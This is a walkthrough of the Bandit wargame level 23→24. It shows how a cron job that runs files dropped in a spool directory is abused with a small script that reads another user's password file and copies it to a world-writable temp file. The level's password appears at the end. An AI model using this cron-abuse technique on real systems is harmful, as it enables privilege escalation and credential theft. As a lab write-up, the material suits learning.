# Level 23 → 24

## Task

A cron job is running automatically as `bandit24`.

The goal is to inspect the cron job and its script, understand how it processes files, and use that behavior to obtain the password for the next level.

## Commands Used

- `ls -la /etc/cron.d/` — lists the available cron jobs.
- `cat /etc/cron.d/cronjob_bandit24` — displays the cron configuration for `bandit24`.
- `cat /usr/bin/cronjob_bandit24.sh` — displays the script executed by the cron job.
- `mkdir /tmp/denisflorinfolder` — creates a temporary working directory.
- `cat > script.sh` — creates a shell script from terminal input.
- `chmod 777 script.sh` — gives the script read, write and execute permissions.
- `touch parola.txt` — creates the file where the password will be written.
- `chmod 777 parola.txt` — allows `bandit24` to write to the file.
- `cp script.sh /var/spool/bandit24/foo/` — places the script in the directory monitored by the cron job.
- `cat parola.txt` — reads the password written by the script.

## Command Breakdown

First, I inspected the cron jobs:

```bash
ls -la /etc/cron.d/
```

I found the following entry:

```text
cronjob_bandit24
```

I then inspected it:

```bash
cat /etc/cron.d/cronjob_bandit24
```

The important line was:

```text
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

This means `/usr/bin/cronjob_bandit24.sh` is executed every minute as the user `bandit24`.

Next, I inspected the script:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

The important part is:

```bash
cd /var/spool/"$myname"/foo || exit

for i in * .*;
do
    owner="$(stat --format "%U" "./$i")"
    if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
        timeout -s 9 60 "./$i"
    fi
    rm -rf "./$i"
done
```

Because the script runs as `bandit24`, `whoami` returns `bandit24`, so it processes files placed inside:

```text
/var/spool/bandit24/foo/
```

If a file is owned by `bandit23` and is a regular file, the cron job executes it as `bandit24`.

I created a temporary working directory:

```bash
mkdir /tmp/denisflorinfolder
cd /tmp/denisflorinfolder
```

Then I created the following script:

```bash
cat > script.sh
```

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/denisflorinfolder/parola.txt
```

I made the script executable:

```bash
chmod 777 script.sh
```

I also created a destination file that `bandit24` could write to:

```bash
touch parola.txt
chmod 777 parola.txt
```

Finally, I copied my script into the directory processed by the cron job:

```bash
cp script.sh /var/spool/bandit24/foo/
```

After waiting for the cron job to run, I checked the output file:

```bash
cat parola.txt
```

The script had been executed as `bandit24`, allowing it to read `/etc/bandit_pass/bandit24` and save the password into my temporary directory.

## Screenshots

![Inspecting the cron job](screenshots/level23-level24_1.png)

![Creating and submitting the script](screenshots/level23-level24_2.png)

![Reading the result](screenshots/level23-level24_3.png)

## Password

<details>
<summary>Click to reveal</summary>

`hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv`

</details>
